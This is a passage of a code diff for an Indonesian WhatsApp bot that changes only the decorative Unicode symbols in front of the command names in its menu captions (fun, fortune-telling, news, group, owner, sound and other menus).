+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bang
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢nob
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢musik
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢mastah
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢slebew
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cantik
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kesel
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ngeselin
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5379,27 +5419,27 @@ case 'funnmenu': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ FUN MENU ]
-┃𖠀⃟❍➢bagaimanakah
-┃𖠀⃟❍➢kapankah
-┃𖠀⃟❍➢apakah
-┃𖠀⃟❍➢bisakah
-┃𖠀⃟❍➢rate
-┃𖠀⃟❍➢wangy
-┃𖠀⃟❍➢gantengcek
-┃𖠀⃟❍➢cekganteng
-┃𖠀⃟❍➢cantikcek
-┃𖠀⃟❍➢cekcantik
-┃𖠀⃟❍➢sangecek
-┃𖠀⃟❍➢ceksange
-┃𖠀⃟❍➢gaycek
-┃𖠀⃟❍➢cekgay
-┃𖠀⃟❍➢lesbicek
-┃𖠀⃟❍➢halah
-┃𖠀⃟❍➢hilih
-┃𖠀⃟❍➢huluh
-┃𖠀⃟❍➢heleh
-┃𖠀⃟❍➢holoh
-┃𖠀⃟❍➢delttt]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bagaimanakah
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kapankah
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢apakah
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bisakah
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢rate
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wangy
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢gantengcek
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cekganteng
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cantikcek
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cekcantik
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢sangecek
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ceksange
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢gaycek
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cekgay
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢lesbicek
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢halah
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢hilih
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢huluh
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢heleh
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢holoh
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢delttt]
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5415,36 +5455,36 @@ case 'primbonmenu': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ PRIMBON MENU ]
-┃𖠀⃟❍➢nomorhoki
-┃𖠀⃟❍➢artimimpi
-┃𖠀⃟❍➢artinama
-┃𖠀⃟❍➢ramaljodoh
-┃𖠀⃟❍➢ramaljodohbali
-┃𖠀⃟❍➢suamiistri
-┃𖠀⃟❍➢ramalcinta
-┃𖠀⃟❍➢cocoknama
-┃𖠀⃟❍➢pasangan
-┃𖠀⃟❍➢jadiannikah
-┃𖠀⃟❍➢sifatusaha
-┃𖠀⃟❍➢rezeki
-┃𖠀⃟❍➢pekerjaan
-┃𖠀⃟❍➢nasib
-┃𖠀⃟❍➢penyakit
-┃𖠀⃟❍➢tarot
-┃𖠀⃟❍➢fengshui
-┃𖠀⃟❍➢haribaik
-┃𖠀⃟❍➢harisangar
-┃𖠀⃟❍➢harisial
-┃𖠀⃟❍➢nagahari
-┃𖠀⃟❍➢arahrezeki
-┃𖠀⃟❍➢peruntungan
-┃𖠀⃟❍➢weton
-┃𖠀⃟❍➢karakter
-┃𖠀⃟❍➢keberuntungan
-┃𖠀⃟❍➢memancing
-┃𖠀⃟❍➢masasubur
-┃𖠀⃟❍➢zodiak
-┃𖠀⃟❍➢shio
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢nomorhoki
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢artimimpi
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢artinama
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ramaljodoh
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ramaljodohbali
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢suamiistri
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ramalcinta
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cocoknama
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢pasangan
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadiannikah
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢sifatusaha
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢rezeki
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢pekerjaan
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢nasib
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢penyakit
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tarot
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢fengshui
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢haribaik
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢harisangar
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢harisial
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢nagahari
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢arahrezeki
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢peruntungan
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢weton
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢karakter
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢keberuntungan
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢memancing
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢masasubur
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢zodiak
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢shio
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5460,10 +5500,10 @@ case 'islamiyah': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ ISLAM MENU ]
-┃𖠀⃟❍➢hadist
-┃𖠀⃟❍➢alquran
-┃𖠀⃟❍➢juzamma
-┃𖠀⃟❍➢tafsirsurah
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢hadist
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢alquran
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢juzamma
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tafsirsurah
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5479,21 +5519,21 @@ case 'beritanews': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ BERITA MENU ]
-┃𖠀⃟❍➢merdeka-news
-┃𖠀⃟❍➢kontan-news 
-┃𖠀⃟❍➢cnbc-news
-┃𖠀⃟❍➢tribun-news
-┃𖠀⃟❍➢indozone-news
-┃𖠀⃟❍➢kompas-news
-┃𖠀⃟❍➢detik-news
-┃𖠀⃟❍➢daily-news
-┃𖠀⃟❍➢inews-news
-┃𖠀⃟❍➢okezone-news
-┃𖠀⃟❍➢sindo-news
-┃𖠀⃟❍➢tempo-news
-┃𖠀⃟❍➢antara-news
-┃𖠀⃟❍➢cnn-news
-┃𖠀⃟❍➢fajar-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢merdeka-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kontan-news 
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cnbc-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tribun-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢indozone-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kompas-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢detik-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢daily-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢inews-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢okezone-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢sindo-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tempo-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢antara-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cnn-news
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢fajar-news
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━• `,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5509,29 +5549,29 @@ case 'groupmenu': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ GROUP MENU ]
-┃𖠀⃟❍➢linkgroup
-┃𖠀⃟❍➢ephemeral [di group]
-┃𖠀⃟❍➢setppgc /full [image]
-┃𖠀⃟❍➢setppbot / full [image]
-┃𖠀⃟❍➢setname [text]
-┃𖠀⃟❍➢setdesc [text]
-┃𖠀⃟❍➢group [option]
-┃𖠀⃟❍➢editinfo [option]
-┃𖠀⃟❍➢add @user
-┃𖠀⃟❍➢kick @user
-┃𖠀⃟❍➢ban [targer]
-┃𖠀⃟❍➢hidetag [text]
-┃𖠀⃟❍➢tagall [text]
-┃𖠀⃟❍➢promote @user
-┃𖠀⃟❍➢demote @user
-┃𖠀⃟❍➢mute on / off
-┃𖠀⃟❍➢getname
-┃𖠀⃟❍➢translate
-┃𖠀⃟❍➢kalkulator
-┃𖠀⃟❍➢intro
-┃𖠀⃟❍➢getpic
-┃𖠀⃟❍➢penjara
-┃𖠀⃟❍➢intro
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢linkgroup
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ephemeral [di group]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setppgc /full [image]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setppbot / full [image]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setname [text]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setdesc [text]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢group [option]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢editinfo [option]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢add @user
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kick @user
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ban [targer]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢hidetag [text]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tagall [text]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢promote @user
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢demote @user
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢mute on / off
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢getname
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢translate
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kalkulator
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢intro
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢getpic
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢penjara
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢intro
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5547,17 +5587,17 @@ case 'voicechanger': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ VOICE MENU ]
-┃𖠀⃟❍➢bass
-┃𖠀⃟❍➢blown
-┃𖠀⃟❍➢deep
-┃𖠀⃟❍➢earrape
-┃𖠀⃟❍➢fast
-┃𖠀⃟❍➢fat
-┃𖠀⃟❍➢nightcore
-┃𖠀⃟❍➢reverse
-┃𖠀⃟❍➢robot
-┃𖠀⃟❍➢slow
-┃𖠀⃟❍➢tupai
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bass
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢blown
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢deep
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢earrape
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢fast
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢fat
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢nightcore
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢reverse
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢robot
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢slow
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tupai
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5588,12 +5628,12 @@ case 'searchmenu': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ SEARCH MENU ]
-┃𖠀⃟❍➢gimage [query]
-┃𖠀⃟❍➢pinterest [query]
-┃𖠀⃟❍➢wallpaper [query]
-┃𖠀⃟❍➢wikimedia [query]
-┃𖠀⃟❍➢ringtone [query]
-┃𖠀⃟❍➢searchgroups [query]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢gimage [query]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢pinterest [query]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wallpaper [query]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wikimedia [query]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ringtone [query]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢searchgroups [query]
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5609,24 +5649,24 @@ case 'scrapconvert': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ SCRAPE CONVERT ]
-┃𖠀⃟❍➢attp
-┃𖠀⃟❍➢ttp
-┃𖠀⃟❍➢toimage
-┃𖠀⃟❍➢sticker
-┃𖠀⃟❍➢emojimix
-┃𖠀⃟❍➢emojimix2
-┃𖠀⃟❍➢tovideo
-┃𖠀⃟❍➢togif
-┃𖠀⃟❍➢tourl
-┃𖠀⃟❍➢tovn
-┃𖠀⃟❍➢toonce
-┃𖠀⃟❍➢tomp3
-┃𖠀⃟❍➢toaudio
-┃𖠀⃟❍➢ebinary
-┃𖠀⃟❍➢dbinary
-┃𖠀⃟❍➢styletext
-┃𖠀⃟❍➢smeme
-┃𖠀⃟❍➢ss [url]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢attp
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ttp
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢toimage
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢sticker
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢emojimix
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢emojimix2
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tovideo
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢togif
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tourl
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tovn
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢toonce
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢tomp3
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢toaudio
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ebinary
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢dbinary
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢styletext
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢smeme
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ss [url]
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5642,10 +5682,10 @@ case 'cmdmenu': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ CMD MENU ]
-┃𖠀⃟❍➢setcmd
-┃𖠀⃟❍➢listcmd
-┃𖠀⃟❍➢delcmd
-┃𖠀⃟❍➢lockcmd
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setcmd
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢listcmd
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢delcmd
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢lockcmd
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5677,26 +5717,26 @@ case 'ownermenu': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ OWNER MENU ]
-┃𖠀⃟❍➢react [emoji]
-┃𖠀⃟❍➢chat [option]
-┃𖠀⃟❍➢join [link]
-┃𖠀⃟❍➢leave
-┃𖠀⃟❍➢block @user
-┃𖠀⃟❍➢unblock @user
-┃𖠀⃟❍➢bcText [text]
-┃𖠀⃟❍➢setexif
-┃𖠀⃟❍➢ban add
-┃𖠀⃟❍➢ping
-┃𖠀⃟❍➢owner
-┃𖠀⃟❍➢creator
-┃𖠀⃟❍➢delete
-┃𖠀⃟❍➢infochat
-┃𖠀⃟❍➢quoted
-┃𖠀⃟❍➢cowner add 628xx
-┃𖠀⃟❍➢listpc
-┃𖠀⃟❍➢listgc
-┃𖠀⃟❍➢listonline
-┃𖠀⃟❍➢speedtest
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢react [emoji]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢chat [option]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢join [link]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢leave
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢block @user
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢unblock @user
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bcText [text]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setexif
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ban add
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ping
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢owner
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢creator
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢delete
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢infochat
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢quoted
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cowner add 628xx
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢listpc
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢listgc
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢listonline
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢speedtest
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5712,29 +5752,29 @@ case 'scraperimage': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ SCRAPE IMAGE ]
-┃𖠀⃟❍➢coffe
-┃𖠀⃟❍➢quotesanime
-┃𖠀⃟❍➢couple
-┃𖠀⃟❍➢wibu
-┃𖠀⃟❍➢loli
-┃𖠀⃟❍➢pat
-┃𖠀⃟❍➢killnom
-┃𖠀⃟❍➢poke
-┃𖠀⃟❍➢wink
-┃𖠀⃟❍➢bonk
-┃𖠀⃟❍➢glomp
-┃𖠀⃟❍➢smug
-┃𖠀⃟❍➢blush
-┃𖠀⃟❍➢wave
-┃𖠀⃟❍➢smile
-┃𖠀⃟❍➢highfive
-┃𖠀⃟❍➢cringe
-┃𖠀⃟❍➢dance
-┃𖠀⃟❍➢happy
-┃𖠀⃟❍➢handhold
-┃𖠀⃟❍➢darkjoke
-┃𖠀⃟❍➢meme
-┃𖠀⃟❍➢meme2
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢coffe
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢quotesanime
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢couple
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wibu
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢loli
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢pat
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢killnom
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢poke
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wink
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bonk
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢glomp
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢smug
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢blush
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wave
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢smile
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢highfive
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cringe
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢dance
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢happy
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢handhold
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢darkjoke
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢meme
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢meme2
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
 contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -5751,167 +5791,167 @@ case 'randomsound': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ Sound Menu ]
-┃𖠀⃟❍➢jansensound1
-┃𖠀⃟❍➢jansensound2
-┃𖠀⃟❍➢jansensound3
-┃𖠀⃟❍➢jansensound4
-┃𖠀⃟❍➢jansensound5
-┃𖠀⃟❍➢jansensound6
-┃𖠀⃟❍➢jansensound7
-┃𖠀⃟❍➢jansensound8
-┃𖠀⃟❍➢jansensound9
-┃𖠀⃟❍➢jansensound10
-┃𖠀⃟❍➢jansensound11
-┃𖠀⃟❍➢jansensound12
-┃𖠀⃟❍➢jansensound13
-┃𖠀⃟❍➢jansensound14
-┃𖠀⃟❍➢jansensound15
-┃𖠀⃟❍➢jansensound16
-┃𖠀⃟❍➢jansensound17
-┃𖠀⃟❍➢jansensound18
-┃𖠀⃟❍➢jansensound19
-┃𖠀⃟❍➢jansensound20
-┃𖠀⃟❍➢jansensound21
-┃𖠀⃟❍➢jansensound22
-┃𖠀⃟❍➢jansensound23
-┃𖠀⃟❍➢jansensound24
-┃𖠀⃟❍➢jansensound25
-┃𖠀⃟❍➢jansensound26
-┃𖠀⃟❍➢jansensound27
-┃𖠀⃟❍➢jansensound28
-┃𖠀⃟❍➢jansensound29
-┃𖠀⃟❍➢jansensound30
-┃𖠀⃟❍➢jansensound31
-┃𖠀⃟❍➢jansensound32
-┃𖠀⃟❍➢jansensound33
-┃𖠀⃟❍➢jansensound34
-┃𖠀⃟❍➢jansensound35
-┃𖠀⃟❍➢jansensound36
-┃𖠀⃟❍➢jansensound37
-┃𖠀⃟❍➢jansensound38
-┃𖠀⃟❍➢jansensound39
-┃𖠀⃟❍➢jansensound40
-┃𖠀⃟❍➢jansensound41
-┃𖠀⃟❍➢jansensound42
-┃𖠀⃟❍➢jansensound43
-┃𖠀⃟❍➢jansensound44
-┃𖠀⃟❍➢jansensound45
-┃𖠀⃟❍➢jansensound46
-┃𖠀⃟❍➢jansensound47
-┃𖠀⃟❍➢jansensound48
-┃𖠀⃟❍➢jansensound49
-┃𖠀⃟❍➢jansensound50
-┃𖠀⃟❍➢jansensound51
-┃𖠀⃟❍➢jansensound52
-┃𖠀⃟❍➢jansensound53
-┃𖠀⃟❍➢jansensound54
-┃𖠀⃟❍➢jansensound55
-┃𖠀⃟❍➢jansensound56
-┃𖠀⃟❍➢jansensound57
-┃𖠀⃟❍➢jansensound58
-┃𖠀⃟❍➢jansensound59
-┃𖠀⃟❍➢jansensound60
-┃𖠀⃟❍➢jansensound61
-┃𖠀⃟❍➢jansensound62
-┃𖠀⃟❍➢jansensound63
-┃𖠀⃟❍➢jansensound64
-┃𖠀⃟❍➢jansensound65
-┃𖠀⃟❍➢jansensound66
-┃𖠀⃟❍➢jansensound67
-┃𖠀⃟❍➢jansensound68
-┃𖠀⃟❍➢jansensound69
